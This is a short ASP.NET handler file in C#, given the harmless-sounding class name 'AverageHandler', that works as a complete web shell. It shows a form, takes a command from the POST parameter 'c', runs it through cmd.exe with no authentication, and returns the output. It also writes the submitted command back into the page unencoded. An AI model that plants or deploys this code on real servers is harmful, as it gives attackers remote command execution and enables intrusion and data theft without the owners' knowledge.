<% @ webhandler language="C#" class="AverageHandler" %>

using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
	public bool IsReusable
	{
		get { return true; }
	}

	public string GetRequestBody()
	{
		var bodyStream = new StreamReader(HttpContext.Current.Request.InputStream);
		bodyStream.BaseStream.Seek(0, SeekOrigin.Begin);
		var bodyText = bodyStream.ReadToEnd();
		return bodyText;
	}

  public void ProcessRequest(HttpContext ctx)
	{
		string command = HttpUtility.ParseQueryString(GetRequestBody()).Get("c");

		ctx.Response.Write("<form method='POST'>Command: <input name='c' value='"+command+"' style='width: 50%'><input type='submit' value='Run'></form>");
		ctx.Response.Write("<hr>");
		ctx.Response.Write("<pre>");

		/* command execution and output retrieval */
		ProcessStartInfo psi = new ProcessStartInfo();
		psi.FileName = "cmd.exe";
		psi.Arguments = "/c "+command;
		psi.RedirectStandardOutput = true;
		psi.UseShellExecute = false;
		Process p = Process.Start(psi);
		StreamReader stmrdr = p.StandardOutput;
		string s = stmrdr.ReadToEnd();
		stmrdr.Close();

		ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
		ctx.Response.Write("</pre>");
		ctx.Response.Write("<hr>");
	}
}
